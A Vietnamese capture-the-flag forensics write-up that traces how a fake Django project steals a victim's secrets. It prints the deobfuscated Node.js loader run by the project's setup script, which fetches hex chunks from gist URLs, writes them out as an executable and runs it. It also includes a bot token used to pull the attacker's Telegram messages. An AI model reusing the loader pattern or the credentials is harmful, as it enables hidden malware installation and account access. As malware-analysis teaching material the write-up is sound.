## The Good Friend:
> - **Author:** duydt
> - **Format flag:** `KMACTF{}`

### a) Đề bài:
Bạn D bỗng nhiên nắm được các bí mật tôi lưu trên máy ngay sau khi tôi chạy thử một dự án do cậu ấy gửi. Hãy giúp tôi điều tra xem làm cách nào D lại có được những thông tin đó.

### b) Phân tích cách làm:
- Đề cho hai file như sau:
![image](https://hackmd.io/_uploads/HJk7_z2KGg.png)
Với nội dung của file thứ hai là:
![image](https://hackmd.io/_uploads/rJCS_G2YGx.png)
Thử tìm hiểu trên Google thì mình tìm được một [trang web](https://www.relianoid.com/resources/knowledge-base/troubleshooting/decrypting-ssl-traffic-with-wireshark-and-tcpdump/) về cách làm việc với file này:
![image](https://hackmd.io/_uploads/HkEp6f2Kfe.png)
Về cơ bản thì file này là chìa khóa để giải mã các lưu lượng liên quan đến SSL/TLS trong Wireshark.
- Trong Wireshark, thử đọc HTTP Stream của packet 14 vì trông nó khá đáng nghi:
![image](https://hackmd.io/_uploads/BJKMxmhYGg.png)
![image](https://hackmd.io/_uploads/S1urxXhtzl.png)
Nhưng chỉ toàn byte rác, khả năng cao những packets kiểu này là để gây nhiễu.
- Kiểm tra tổng quan các giao thức có trong challenge:
![image](https://hackmd.io/_uploads/HJgyb72FGx.png)
Chú ý rằng có QUIC, TLS và HTTP/2. Trong quá trình tìm những thông tin liên quan đến `sslkeylog.log` thì mình còn thấy một trang web khác:
![image](https://hackmd.io/_uploads/BJzvZX2tfg.png)
Chúng ta sẽ lưu ý đến cả giao thức QUIC. Thử tìm những packets liên quan đến giao thức QUIC hoặc SSL/TLS:
![image](https://hackmd.io/_uploads/H1a7fQnYGl.png)
Mặc dù đã apply `sslkeylog.log` vào Wireshark nhưng những packet kiểu này vẫn không đọc được, kể cả khi xem với `Decrypted QUIC` nên khả năng cao chúng là byte rác.
- Đọc kĩ lại đề bài, chúng ta biết rằng victim đã tải và chạy thử một dự án của bạn mình. Để tải một file từ mạng thì thường ta sẽ cần giao thức HTTP/HTTPS, TCP, FTP. Với challenge này chúng ta sẽ tập trung vào HTTP/2, TLS và TCP, có thể có cả QUIC nếu cần thiết.
- Kiểm tra các packet liên quan đến HTTP/2:
![image](https://hackmd.io/_uploads/Skattu6Yzl.png)
Sau khi tăng độ cận thì mình tìm được packet có title rất đáng nghi. Export file ra để phân tích thử:
![image](https://hackmd.io/_uploads/rkuECvpKGx.png)
- Thử kiểm tra bằng Ubuntu thì đây là một file Unicode text rất dài:
![image](https://hackmd.io/_uploads/By941u6YGg.png)
![image](https://hackmd.io/_uploads/BJot-uaFfe.png)
Đây chỉ là file `.html`. Nhưng mình sẽ thử truy cập vào [link tải](https://github.com/tibisachi/SetupCTF_book) tệp `.zip` này:
![image](https://hackmd.io/_uploads/rJc7GOpKzg.png)
- Ở `README`:
![image](https://hackmd.io/_uploads/H1zoQ_TYGe.png)
Phần mềm này yêu cầu chúng ta chạy file `init.ps1` trong PowerShell và hướng dẫn cách chạy nó. Nội sung của `init.ps1`:
    ``` ps1
    if (-not (Get-Command py -ErrorAction SilentlyContinue)) {
        throw "Python Launcher (py) was not found. Install Python 3.9 first."
    }

    py -3.9 --version *> $null
    if ($LASTEXITCODE -ne 0) {
        throw "Python 3.9 was not found. Install it with: winget install -e --id Python.Python.3.9"
    }

    if (-not (Test-Path ".\.venv\Scripts\python.exe")) {
        Write-Host "Creating Python 3.9 virtual environment..." -ForegroundColor Cyan
        py -3.9 -m venv .venv
        if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    }

    Write-Host "Installing Python dependencies..." -ForegroundColor Cyan
    & ".\.venv\Scripts\python.exe" -m pip install -r requirements.txt
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

    if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
        throw "Node.js was not found. Install Node.js and reopen PowerShell."
    }

    Write-Host "Running static/admin/js/util.js..." -ForegroundColor Cyan
    node .\static\admin\js\util.js
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

    Write-Host "Initialization completed successfully." -ForegroundColor Green
    ```
    Ở đây mình chú ý tới `.\static\admin\js\util.js`.
- Trong `manage.py` của link GitHub này:
![image](https://hackmd.io/_uploads/Sy7NXOaYGe.png)
Script trên điều khiển việc thực thi lệnh. Hướng này không đúng lắm.
- Theo dõi lại luồng packet trong Wireshark thì mình đã bỏ qua chi tiết victim tải file `main.zip`:
![image](https://hackmd.io/_uploads/HkfPtdpYMl.png)
Export file đó:
![image](https://hackmd.io/_uploads/BkQBF_aKMg.png)
![image](https://hackmd.io/_uploads/H1fY9_6KGe.png)
Đây đúng là một file `.zip`, mình sẽ đổi đuôi và extract nó ra.
- Sau khi giải nén, mình dùng FTK Imager để dễ xem cấu trúc thư mục hơn:
![image](https://hackmd.io/_uploads/BJgS2uaFMl.png)
Tất nhiên là sẽ có những file `.js` và các files khác trong các thư mục cha. Thử đọc `.\static\admin\js\util.js`:
![image](https://hackmd.io/_uploads/Skuo4YTKGl.png)
Đoạn mã trên đã bị cắt bớt dấu cách, space để giảm dung lượng. Nhưng về cơ bản thì nội dung nó như sau:
    ``` js
    const https = require('https'),
          fs = require('fs'),
          path = require('path'),
          { execFile } = require('child_process');

    const _0x4a2b = [
      'https://gist.githubusercontent.com/tibisachi/ade071ed7d2ae24fb85a17c7057b2bbb/raw/db0147d28342ddabcd566eb21e9313f6a4e0c7e0/q.hex',
      'https://gist.githubusercontent.com/tibisachi/ec907586db6bf4f0aa24d1b8391029b6/raw/03e7bcb132ac62ec09e4e68584f4d1d0c96b5dbe/w.hex',
      'https://gist.githubusercontent.com/tibisachi/4e760ff80516f8ce2530cfe7b544df8e/raw/7af5d36817113c3647431f370c7f19f9a96bbd96/e.hex',
      'https://gist.githubusercontent.com/tibisachi/8e8579c377c1df785346199debacbe69/raw/921b271195f492033b4d7a7644279fc3f6b151e8/r.hex',
      'https://gist.githubusercontent.com/tibisachi/952251230428755b906c3be3d867fc9b/raw/0c0d5f73f5b4099779a2a80806f556ec764166d2/t.hex',
      'https://gist.githubusercontent.com/tibisachi/68732f23c13e097d2057a6a5736f6263/raw/5b9853f0f4dc8742c81702160563d69f7406959a/y.hex',
      'https://gist.githubusercontent.com/tibisachi/8388edeb7c9e6347a54db676b0183180/raw/39cd2889f40e28069957126fa3a4262a2df962be/u.hex',
      'https://gist.githubusercontent.com/tibisachi/ddfe6fb1cf946fd8d928082ab41d182a/raw/56a2324f4a13fc92db175807c7ae7814d1221e35/i.hex',
      'https://gist.githubusercontent.com/tibisachi/fbe7871a0a13a79c1b19ae80e9f7c123/raw/145735667d077455a827287527ec6d6a82e87920/o.hex',
      'https://gist.githubusercontent.com/tibisachi/f8b0756a2312858c022dd969858cf60f/raw/5044177b298e0967e395196ad075b06cdecf4067/p.hex'
    ];

    const _0x3e8c = path.join(__dirname, 'setup.exe'),
          _0x2d1f = __dirname;

    const _0x5c7a = _0x3e8c => new Date().toISOString();

    function _0x1a2e(_0x4f2a) {
      console.log(`[${_0x5c7a()}] ${_0x4f2a}`);
    }

    function _0x4c3b(_0x2e8f, _0x5d6a) {
      console.error(`[E] ${_0x2e8f}`);
      _0x5d6a && console.error(`[E] ${_0x5d6a.message}`);
    }

    function _0x3f7c(_0x1e4e, _0x3a6c = 3) {
      return new Promise((_0x2b1a, _0x4d8c) => {
        const _0xf5d1 = _0x1e5c => {
          _0x1a2e(`F ${_0x1e5c}/${_0x3a6c}: ${_0x1e4e.substring(0, 50)}...`);
      
          https.get(_0x1e4e, { timeout: 1e4 }, _0x3c5a => {
            if (200 !== _0x3c5a.statusCode) {
              return _0x4d8c(new Error(`HTTP ${_0x3c5a.statusCode}`));
            }
        
            let _0x15af = '';
            _0x3c5a.on('data', _0x5e2c => _0x15af += _0x5e2c.toString());
            _0x3c5a.on('end', () => _0x2b1a(_0x15af.replace(/[^0-9a-fA-F]/g, '')));
        
          }).on('error', _0x19f8 => {
            _0x1e5c < _0x3a6c 
              ? (_0x1a2e(`W ${_0x1e5c}F`), setTimeout(() => _0xf5d1(_0x1e5c + 1), 2e3))
              : _0x4d8c(_0x19f8);
          }).on('timeout', () => {
            _0x1e5c < _0x3a6c 
              ? (_0x1a2e(`W T`), setTimeout(() => _0xf5d1(_0x1e5c + 1), 2e3))
              : _0x4d8c(new Error('TO'));
          });
        };
    
        _0xf5d1(1);
      });
    }

    (async () => {
      try {
        _0x1a2e('='.repeat(40));
        _0x1a2e(`D: ${_0x2d1f}`);
        _0x1a2e(`B: ${_0x3e8c}`);
        _0x1a2e(`F ${_0x4a2b.length}...`);
    
        let _0x2c3a = '';
    
        for (let _0x5f4e = 0; _0x5f4e < _0x4a2b.length; _0x5f4e++) {
          try {
            const _0x1b8f = await _0x3f7c(_0x4a2b[_0x5f4e]);
            _0x2c3a += _0x1b8f;
            _0x1a2e(`[${_0x5f4e + 1}/${_0x4a2b.length}] OK (${_0x2c3a.length})`);
          } catch (_0x4e9f) {
            _0x4c3b(`F ${_0x5f4e + 1}`, _0x4e9f);
            throw _0x4e9f;
          }
        }
    
        _0x1a2e(`A: ${_0x2c3a.length}`);
        _0x1a2e('C H2B...');
    
        const _0x3d2e = Buffer.from(_0x2c3a, 'hex');
        _0x1a2e(`S: ${_0x3d2e.length}`);
        _0x1a2e(`W: ${_0x3e8c}`);
    
        const _0x1f5c = path.dirname(_0x3e8c);
        fs.existsSync(_0x1f5c) || fs.mkdirSync(_0x1f5c, { recursive: !0 });
        fs.existsSync(_0x3e8c) && fs.unlinkSync(_0x3e8c);
        fs.writeFileSync(_0x3e8c, _0x3d2e);
    
        if (!fs.existsSync(_0x3e8c)) throw new Error('NF');
    
        const _0x4f1a = fs.statSync(_0x3e8c);
        _0x1a2e(`V: ${_0x4f1a.size}`);
    
        try {
          fs.chmodSync(_0x3e8c, 493);
        } catch (_0x5b2d) {}
    
        const _0x2e5a = execFile(_0x3e8c, (_0x3f1a, _0x2d8f, _0x1b3e) => {
          _0x3f1a && _0x4c3b('E', _0x3f1a);
          _0x2d8f && console.log(_0x2d8f);
          _0x1b3e && console.error(_0x1b3e);
        });
    
        _0x2e5a.on('exit', _0x4c7d => {
          _0x1a2e(`X: ${_0x4c7d}`);
          setTimeout(() => {
            _0x1a2e('C...');
            try {
              fs.existsSync(_0x3e8c) && fs.unlinkSync(_0x3e8c);
              _0x1a2e('D OK');
            } catch (_0x3e8c) {
              _0x4c3b('D F', _0x3e8c);
            }
            _0x1a2e('='.repeat(40));
          }, 2e3);
        });
    
        _0x2e5a.on('error', _0x1e8c => _0x4c3b('XE', _0x1e8c));
    
      } catch (_0x2a1f) {
        _0x4c3b('CE', _0x2a1f);
        process.exit(1);
      }
    })();
    ```
    Thử truy cập một vài link trong biến `_0x4a2b`:
    ![image](https://hackmd.io/_uploads/Skw25iz5fe.png)
Toàn bộ đều là hex, nghĩa là mình cần phải làm gì đó với những link này, kiểu như decode. Mình thử dùng CyberChef thì:
![image](https://hackmd.io/_uploads/ry7zniGqMg.png)
Phát hiện có dòng `This program cannot be run in DOS mode.`, nghĩa là những link này chứa script của một chương trình. Phân tích script thì đại loại là nó đọc data từ các link được cho, sau đó xào nấu một chút để biến thành script thực thi.
- Viết một đoạn script để gộp các file lại với nhau, sau đó decode:
    ``` py
    import urllib.request, re

    urls = [
      'https://gist.githubusercontent.com/tibisachi/ade071ed7d2ae24fb85a17c7057b2bbb/raw/db0147d28342ddabcd566eb21e9313f6a4e0c7e0/q.hex',
      'https://gist.githubusercontent.com/tibisachi/ec907586db6bf4f0aa24d1b8391029b6/raw/03e7bcb132ac62ec09e4e68584f4d1d0c96b5dbe/w.hex',
      'https://gist.githubusercontent.com/tibisachi/4e760ff80516f8ce2530cfe7b544df8e/raw/7af5d36817113c3647431f370c7f19f9a96bbd96/e.hex',
      'https://gist.githubusercontent.com/tibisachi/8e8579c377c1df785346199debacbe69/raw/921b271195f492033b4d7a7644279fc3f6b151e8/r.hex',
      'https://gist.githubusercontent.com/tibisachi/952251230428755b906c3be3d867fc9b/raw/0c0d5f73f5b4099779a2a80806f556ec764166d2/t.hex',
      'https://gist.githubusercontent.com/tibisachi/68732f23c13e097d2057a6a5736f6263/raw/5b9853f0f4dc8742c81702160563d69f7406959a/y.hex',
      'https://gist.githubusercontent.com/tibisachi/8388edeb7c9e6347a54db676b0183180/raw/39cd2889f40e28069957126fa3a4262a2df962be/u.hex',
      'https://gist.githubusercontent.com/tibisachi/ddfe6fb1cf946fd8d928082ab41d182a/raw/56a2324f4a13fc92db175807c7ae7814d1221e35/i.hex',
      'https://gist.githubusercontent.com/tibisachi/fbe7871a0a13a79c1b19ae80e9f7c123/raw/145735667d077455a827287527ec6d6a82e87920/o.hex',
      'https://gist.githubusercontent.com/tibisachi/f8b0756a2312858c022dd969858cf60f/raw/5044177b298e0967e395196ad075b06cdecf4067/p.hex'
    ]
    h = "".join(re.sub(r'[^0-9a-fA-F]', '', urllib.request.urlopen(u).read().decode()) for u in urls)
    open('output.bin', 'wb').write(bytes.fromhex(h))
    ```
    Thì mình được một output như sau:
    ![image](https://hackmd.io/_uploads/H1TAc2z9Gl.png)
    Có rất nhiều byte rác, tuy nhiên ở đoạn cuối thì đoạn script đã hiện ra:
    ![image](https://hackmd.io/_uploads/HyfMshGcfl.png)
    Thử kiểm tra loại file của `output.bin`:
    ![image](https://hackmd.io/_uploads/ByYi1afqfe.png)
    Đây là file `.exe`, vì thế mình đổi đuôi file thành `.exe` để tiện phân tích.
- Thử check hash của nó trên VirusTotal:
![image](https://hackmd.io/_uploads/BJnF7pG5Ml.png)
![image](https://hackmd.io/_uploads/rkCu76Gqfl.png)
Đây chính là trojan malware (`l0mxuueiy.exe`). Check xem nó được viết bằng ngôn ngữ gì với Detect It Easy:
![image](https://hackmd.io/_uploads/Hkjodazqzg.png)
Nó được viết bằng Python, mình sẽ dùng [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor) để phân tích nó.
![image](https://hackmd.io/_uploads/H1spF6Mcfx.png)
Mình được một thư mục giải nén `output.exe_extracted` như sau:
![image](https://hackmd.io/_uploads/ryIg0xEczx.png)
![image](https://hackmd.io/_uploads/B1gXCxEcfl.png)
- Trong thư mục vừa giải nén, mình thấy file `ctf_book_setup.pyc`:
![image](https://hackmd.io/_uploads/rkKDkZVcGl.png)
Dùng [PyLingual](https://pylingual.io/) để decomplier file này:
![image](https://hackmd.io/_uploads/Bya1lbVcfx.png)
Sau khi mình đọc thử thì đại loại là đoạn script này dùng để lấy thông tin cá nhân từ máy tính, database của victim sau đó gửi về Telegram của attacker. Ở hàm `main()` có thông tin của Telegram bot:
![image](https://hackmd.io/_uploads/B1NbQbV9Gg.png)
Thử dùng Bot Token và Chat ID trên để xem JSON của nó:
![image](https://hackmd.io/_uploads/S1bdm-NqMx.png)
![image](https://hackmd.io/_uploads/BJeqXbNcGg.png)
Lỗi `409` xuất hiện do Telegram Bot này đang bật cơ chế Webhook, thử kiểm tra thông tin thì:
![image](https://hackmd.io/_uploads/SJvhN-4cMe.png)
`https://tele.goldenherd.com/tg/webhook/8698629716` chính là địa chỉ C2 mà Telegram chuyển dữ liệu về. Thử kiểm tra URL này thì nó off rồi .-.
![image](https://hackmd.io/_uploads/rk8ZBbN9Gl.png)
- Quay lại đọc script, mình có chú ý rằng script này có mã hóa cái gì đó. Hàm `seDJkcNSgB()` sau dùng để nén thông tin victim thành file `Data.zip` rồi mã hóa:
![image](https://hackmd.io/_uploads/B1qtS-45fx.png)
Thuật toán được mã hóa được truyền vào từ các hàm `itWVhandHx`, `PfUxzowRWm`, và `MPOaqWuYkH`:
![image](https://hackmd.io/_uploads/B1eWLZEcGx.png)
Và khóa được truyền từ `nyCidxJVDf()`:
![image](https://hackmd.io/_uploads/ryVUIW45Gx.png)
Hàm này gửi một request đến `https://api.ipify.org?format=json`, và trả về địa chỉ Public IP của victim, `192.168.111.128` chỉ là Local IP.
![image](https://hackmd.io/_uploads/r1cNwZV5Gx.png)
Có thể thấy rằng `171.250.163.13` chính là key.
Vị trí của `Data.zip` nằm ở thư mục `Pictures` của victim:
![image](https://hackmd.io/_uploads/SJBzY-E9zl.png)
- Vì `Data.zip` đã được gửi thành công lên Telegram của attacker nên mình sẽ thử tìm nó bằng cách copy tin nhắn bên Telegram của attacker sang Telegram của mình. Đầu tiên là phải lấy được Chat ID của cá nhân mình:
![image](https://hackmd.io/_uploads/B1Xmp-N9Ml.png)
Cho phép `soteolo` gửi tin nhắn về Telegram của mình bằng `/start`:
![image](https://hackmd.io/_uploads/S1yLT-Vqfx.png)
Chạy script sau để request, mình sẽ lặp khoảng 150 lần:
    ``` py
    import requests
    for m in range(1, 150):
        try: requests.post("https://api.telegram.org/bot8698629716:AAHYMShQ4fkNv5r3vEqaKh-lcXhWpujT82M/copyMessage", json={"chat_id": "??????????", "from_chat_id": "7870990883", "message_id": m}, timeout=10)
        except: pass
    ```
    Và mình có được các output sau:
    ![image](https://hackmd.io/_uploads/HyGXkG45fx.png)
- Chạy script sau để giải mã `Data.zip` với thuật toán và key đã biết:
    ``` py
    import os

    k = b"171.250.163.13"
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + k[i % len(k)]) % 256
        S[i], S[j] = S[j], S[i]
    with open(r"C:\Users\Ha Nguyen\Desktop\CTF\chall\Data.zip", "rb") as f: d = f.read()
    
    i = j = 0
    o = bytearray()
    for c in d:
        i = (i + 1) % 256; j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        o.append(c ^ S[(S[i] + S[j]) % 256])
    p = os.path.abspath("Decrypted.zip")
    with open(p, "wb") as f: f.write(o)
    print(p)
    ```
    Mình được file `Decrypted.zip` như sau:
    ![image](https://hackmd.io/_uploads/r1eEbzVqMe.png)
    Giải nén ra và vào thư mục `Pictures`:
    ![HacCo](https://hackmd.io/_uploads/BJk6MMNqMe.png)
    
### c) Kết quả
`KMACTF{1_L1K3_H3R}`
